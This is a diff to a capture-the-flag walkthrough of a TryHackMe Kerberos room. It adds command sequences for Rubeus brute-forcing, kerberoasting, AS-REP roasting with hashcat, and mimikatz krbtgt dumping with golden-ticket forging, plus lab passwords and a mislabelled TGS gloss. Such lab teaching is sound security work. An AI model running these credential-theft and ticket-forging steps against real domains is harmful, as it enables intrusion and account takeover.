@@ -35,11 +35,15 @@ Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Doma
 Answer : Ticket Granting Ticket
 {% endhighlight %}
 
+> TGT represents a ticket that the KDC gives us to access a service
+
 **Question :** What does SPN stand for ?
 
 {% highlight html %}
 Answer : Service Principal Name
 {% endhighlight %}
+
+> SPN is the combination of a service, the machine hosting the service and the service class
 
 **Question :** What does PAC stand for ?
 
@@ -47,15 +51,25 @@ Answer : Service Principal Name
 Answer : Privilege Attribute Certificate
 {% endhighlight %}
 
+> The PAC is a kind of extension of the Kerberos protocol used by Microsoft for the proper management of rights in an Active Directory
+
 **Question :** What two services make up the KDC ?
 
 {% highlight html %}
 Answer : AS, TGS
 {% endhighlight %}
 
+> "*AS*" for **Authentication Service**, corresponds to the authentication phase of the user at the KDC
+
+> "*TGS*" for **Ticket Granting Ticket**, corresponds to the request for a ticket to access a selected service
+
 ## Enumeration w/ Kerbrute
 
+> First, we list the open ports and therefore the services that are running. We use **nmap** for this: 
+
 ![image](https://user-images.githubusercontent.com/80531900/170521501-ea85c969-77f7-4d95-afbc-55b96bdb47c0.png){: class="bigger-image" }
+
+> We see that port 3389 (RDP) is running on the machine, we get the domain name
 
 * Pre-requisite :
 {% highlight html %}
@@ -110,6 +124,23 @@ Answer : User3
 
 ## Harvesting & Brute-Forcing Tickets w/ Rubeus
 
+* Connection to the remote machine via SSH :
+{% highlight html %}
+# ssh Administrator@"THM_Machine_IP"
+# Password : P@$$W0rd
+{% endhighlight %}
+
+* Pre-requisite :
+{% highlight html %}
+# echo "THM_Machine_IP   CONTROLLER.LOCAL" >> C:\Windows\System32\drivers\etc\hosts
+# cd Downloads
+{% endhighlight %}
+
+* Execute Rubeus.exe : 
+{% highlight html %}
+# Rubeus.exe brute /password:Password1 /noticket
+{% endhighlight %}
+
 **Question :** Which domain admin do we get a ticket for when harvesting tickets ?
 
 {% highlight html %}
@@ -124,6 +155,30 @@ Answer : CONTROLLER-1
 
 ## Kerberoasting w/ Rubeus & Impacket
 
+* With Rubeus.exe :
+{% highlight html %}
+# cd Downloads
+# Rubeus.exe kerberoast
+# We retrieve the kerberos **hash** of a user
+# wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
+# echo **Retrieve_Hash** > hash.txt 
+# hashcat -m 13100 -a 0 hash.txt Pass.txt
+{% endhighlight %}
+
+* With Impacket :
+{% highlight html %}
+# wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
+# cd /opt
+# wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz
+# tar -xzvf impacket-0.9.19.tar.gz
+# cd impacket-0.9.19/
+# pip install .
+# cd /usr/share/doc/python3-impacket/examples/
+# sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip "THM_Machine_Ip" -request
+# echo "Hash" > hash.txt 
+# hashcat -m 13100 -a 0 hash.txt Pass.txt
+{% endhighlight %}
+
 **Question :** What is the HTTPService Password ?
 
 {% highlight html %}
@@ -137,6 +192,19 @@ Answer : MYPassword123#
 {% endhighlight %}
 
 ## AS-REP Roasting w/ Rubeus
+
+* Dumping KRBASREP5 Hashes :
+{% highlight html %}
+# Rubeus.exe asreproast
+{% endhighlight %}
+
+* Cracking KRBASREP5 Hashes :
+{% highlight html %}
+# echo "Hash" > hash.txt
+# hashcat -m 18200 hash.txt Pass.txt
+{% endhighlight %}
+
+> Note : We need to add the value "$23" after "$krb5asrep" in the hash file to crack the **hash** !
 
 **Question :**  What hash type does AS-REP Roasting use ? 
 
@@ -169,6 +237,24 @@ Answer : P@$$W0rd2
 {% endhighlight %}
 
 ## Golden/Silver Ticket Attacks w/ mimikatz
+
+* Dumping "*krbtgt*" hash :
+{% highlight html %}
+# cd Downloads && mimikatz.exe
+# privilege::debug
+# lsadump::lsa /inject /name:krbtgt
+{% endhighlight %}
+
+* Creation of a Gold/Silver ticket :
+{% highlight html %}
+# Kerberos::golden /user:Administrator /domain:controller.local /sid:"SID_KRBTGT" /krbtgt:"NTLM" /id:"Admin"
+{% endhighlight %}
+
+* Use the Gold/Silver ticket to access another machine :
+{% highlight html %}
+# misc::cmd
+# dir \\DESKTOP-1\c$
+{% endhighlight %}
 
 **Question :** What is the SQLService NTLM Hash ?
 
